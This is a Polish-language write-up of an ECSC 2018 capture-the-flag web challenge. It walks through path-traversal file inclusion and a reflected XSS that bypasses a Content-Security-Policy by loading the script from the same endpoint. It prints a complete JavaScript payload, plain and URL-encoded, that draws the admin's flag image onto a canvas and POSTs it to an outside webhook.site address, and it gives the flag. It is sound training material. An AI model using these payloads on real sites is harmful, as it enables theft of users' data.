Art (web, 300 punktów)
===
*Eliminacje do European Cyber Security Challenge - Seniorzy*
***Jan Góra, 14.02.2018***

## Wstęp
Opis zadania jest tutaj bardzo istotny i wygląda on następująco:
> I've just created a cool service for presenting charts in Flask. Here's a test deployment hosted on my laptop. If you find any issue, just send me a link - I'll check if everything is fine. Flag is in /flag.
>
> https://web-art.ecsc18.hack.cert.pl
>
> Update 2018-06-25 21:15: Unfortunately my laptop is very slow and my browser hangs on websites with long addresses, so I asked my friend to create an extension for me that limits the url to 1024 characters. Now it works smoothly!

> Format flagi: ecsc{litery_cyfry_i_znaki_specjalne}.

Z samego opisu zadania można się już domyślać, że w zadaniu najprawdopodobniej pojawią się dwa ataki. Jeden typu LFI (Local File Inclusion) i drugi taki, który wymaga interakcji z adminem, np. XSS (Cross-Site Scripting), ponieważ flaga znajduje się w `/flag` oraz możliwe jest wysyłanie linków do admina.

## Szybka analiza
W atakach, które wymagają interakcji z adminem, ważne jest, aby uważnie prześledzić nagłówki odpowiedzi HTTP (HTTP Response Headers).

### Nagłówki HTTP
![](https://i.imgur.com/8yDLQsh.png)

Możemy zauważyć trzy istotne rzeczy:
- Nagłówek `X-XSS-Protection: 0` jest ustawiony na `0` co oznacza, że strona nie jest chroniona przed odbitym XSS (Reflected XSS Attack).
- Nagłówek `X-Frame-Options: deny` oznacza, że strona nie może zostać umieszczona w ramkach `iframe`.
- Nagłówek 'Content-Security-Policy' ustawia:
    - domyślny URL `default-src` dla wszystkich zasobów na 'none' co oznacza, że dostęp do wszystkich niewymienionych zasobów (w tym zasobów ładowanych `inline`) zostanie zablokowany.
    - `script-src 'self'` oznacza, że skrypty mogą być ładowane jedynie z tej samej domeny
    - `style-src 'self' 'unsafe-inline'` oznacza, że style moga być ładowane jedynie z tej samej domeny bądź jako elementy `inline`
    - `img-src 'self'` obrazki mogą być załadowane jedynie z tej samej domeny.

Nic ciekawego w nagłówkach już nie znajdziemy. Przejdźmy do analizy funkcjonalności strony.

### Wykresy
Da się zauważyć, że wykresy ładowane są w następujący sposób: https://web-art.ecsc18.hack.cert.pl/chart?chart=a. Skrypt przyjmuje parametr `chart` i po szybkim sprawdzeniu, adres https://web-art.ecsc18.hack.cert.pl/chart?chart=../../../../../../flag wywołuje komunikat `Forbidden`. Wygląda jak LFI. Faktycznie, spróbujmy adres https://web-art.ecsc18.hack.cert.pl/chart?chart=css/style.css w którym naszym oczom ukazuje się bardzo dziwny wykres. Na podstawie tego można już odszyfrować w jaki sposób wykresy są rysowane, ale to później.

![](https://i.imgur.com/mg0kVl0.png)

Co jeśli podamy nieistniejący plik? Spróbujmy https://web-art.ecsc18.hack.cert.pl/chart?chart=%3Cu%3Ehello%3C/u%3E. Dostajemy wiadomość, że plik nie został znaleziony oraz widać podkreślenie! To znaczy, że udało nam się wstrzyknąć kod HTML. Kod wygląda następująco:

![](https://i.imgur.com/GVYUyfI.png)

Spróbujmy więc: https://web-art.ecsc18.hack.cert.pl/chart?chart=%3Cscript%3Ealert(1)%3C/script%3E. Nic się nie zadziałało, a to ponieważ skrypty mogą być ładowane tylko z tej samej domeny i nie mogą być `inline` jak w tym przypadku!

![](https://i.imgur.com/kBfnhik.png)

A co gdybyśmy zrobili taką sztuczkę `chart?chart=<script src="chart?chart=alert(1);//">script&gt;`? Powinno zadziałać, ponieważ skrypt ładowany jest z tej samej domeny, sprawdźmy https://web-art.ecsc18.hack.cert.pl/chart?chart=%3Cscript%20src=%22chart?chart=alert(1);//%22%3E%3C/script%3E. Bingo!

![](https://i.imgur.com/rGWdX3b.png)

### Kontakt
Na podstronie `Contact` mamy formularz, w którym możemy wysłać adminowi odnośnik.

![](https://i.imgur.com/6CK5uoI.png)

Spróbujmy wysłać adminowi adres do naszej strony, aby zobaczyć co się stanie. Do wygenerowania adresu wykorzystałem stronę https://webhook.site, którą serdercznie polecam.

Widać, że admin odwiedza dowolny adres i nagłówki HTTP jakie przy tym udostępnia, wyglądają następująco:

![](https://i.imgur.com/lKJz76E.png)

## Plan
Wiemy już jakie są podatności, wiemy też, że nie możemy wyświetlić pliku flagi, ale może admin może? Nawet jeśli admin może wyświetlić flagę to, w jaki sposób możemy ją przesłać na nasz server? Z nagłówków nie wynika to jednoznacznie, ale każda próba dostania się do flagi poprzez `XMLHttpRequest` skończy się niepowedzeniem.

![](https://i.imgur.com/XtP3q8c.png)

Tak naprawdę jedyny sposób na wyświetlenie flagi to załączenie jej jako obrazek w domenie `web-art.ecsc18.hack.cert.pl`.

Okazuje się, że istnieje trick na przeczytanie pixeli z obrazka przy użyciu elementu `<canvas>` i wydrukowanie ich w formacie, np. `base64`.

![](https://i.imgur.com/SWDgUDk.png)

Teraz powstaje pytanie, w jaki sposób można wysłać dane na nasz server? Istnieje kilka technik bez używania `XMLHttpRequest`, które twórcy zadania przegapili. Ideą rozwiązania miało być odszyfrowanie działania wykresów, a przy tym odczytanie flagi poprzez napisanie odpowiedniego skryptu mieszcząc się w limicie 1024 znaków. Taką flagę można później przesłać na serwer, używając np.
```js
window.location='http://website.org/?f='+flag
```

Wysłanie obrazka w ten sposób się nie powiedzie ze względu na limit znaków. Próbowałem odczytywać flagę fragmentami i byłem nawet blisko rozwiązania, po czym znalazłem lepszy sposób, który autorzy przegapili. Wystarczy stworzyć formularz typu `POST` i wysłać flagę na server :)

Kompletny kod, jaki należy wysłać adminowi, wygląda więc następująco:
```js
d=document;
x=c=>d.createElement.call(d,c);

i=x('img');
i.src='https://web-art.ecsc18.hack.cert.pl/chart?chart=../../../../../../flag';
c=x('canvas');

i.onload = function(){
c.width=i.width;c.height=i.height;
c.getContext("2d").drawImage(i, 0, 0);
a=x('form');
b=x('input');
a.method='POST';
a.action = 'https://webhook.site/ca40349e-56c5-4610-bbfc-4942ebf46842';
b.name='f';
b.value=c.toDataURL("image/png");
a.appendChild(b);
d.body.appendChild(a);
a.submit();
};
```

Zakodowany URL wygląda następująco: [https://web-art.ecsc18.hack.cert.pl/chart?chart=%3Cscript%20src%3D%22chart%3Fchart%3D(()%253D%253E%257Bd%253Ddocument%253Bx%253Dc%253D%253Ed.createElement.call(d%252Cc)%253Bi%253Dx('img')%253Bi.src%253D'https%253A%252F%252Fweb-art.ecsc18.hack.cert.pl%252Fchart%253Fchart%253D..%252F..%252F..%252F..%252F..%252F..%252F..%252Fflag'%253Bc%253Dx('canvas')%253Bi.onload%253Dfunction()%257Bc.width%253Di.width%253Bc.height%253Di.height%253Bc.getContext(%25222d%2522).drawImage(i%252C0%252C0)%253Ba%253Dx('form')%253Bb%253Dx('input')%253Ba.method%253D'POST'%253Ba.action%253D'https%253A%252F%252Fwebhook.site%252Fca40349e-56c5-4610-bbfc-4942ebf46842'%253Bb.name%253D'f'%253Bb.value%253Dc.toDataURL(%2522image%252Fpng%2522)%253Ba.appendChild(b)%253Bd.body.appendChild(a)%253Ba.submit()%253B%257D%253B%257D)()%252F%252F%22%3E%3C%2Fscript%3E](https://web-art.ecsc18.hack.cert.pl/chart?chart=%3Cscript%20src%3D%22chart%3Fchart%3D(()%253D%253E%257Bd%253Ddocument%253Bx%253Dc%253D%253Ed.createElement.call(d%252Cc)%253Bi%253Dx('img')%253Bi.src%253D'https%253A%252F%252Fweb-art.ecsc18.hack.cert.pl%252Fchart%253Fchart%253D..%252F..%252F..%252F..%252F..%252F..%252F..%252Fflag'%253Bc%253Dx('canvas')%253Bi.onload%253Dfunction()%257Bc.width%253Di.width%253Bc.height%253Di.height%253Bc.getContext(%25222d%2522).drawImage(i%252C0%252C0)%253Ba%253Dx('form')%253Bb%253Dx('input')%253Ba.method%253D'POST'%253Ba.action%253D'https%253A%252F%252Fwebhook.site%252Fca40349e-56c5-4610-bbfc-4942ebf46842'%253Bb.name%253D'f'%253Bb.value%253Dc.toDataURL(%2522image%252Fpng%2522)%253Ba.appendChild(b)%253Bd.body.appendChild(a)%253Ba.submit()%253B%257D%253B%257D)()%252F%252F%22%3E%3C%2Fscript%3E), który zajmuje 831 znaków. Z jakiegoś powodu serwer nie chce wysłać obrazka flagi (być może zepsute zadanie), ale mogę zagwarantować, że to rozwiązanie powinno działać, rozwiązałem je podczas zawodów (wysyłanie innych zasobów działa).

Obrazek flagi wygląda następująco:

![](https://i.imgur.com/J9IZcQ1.png)

Wysokość każdego pixela to zakodowana litera w ascii przesunięta o 20 pixeli. Odczytując każdy pixel z osobna można odczytać, że flaga to **ecsc{X5S_is_a_art}**
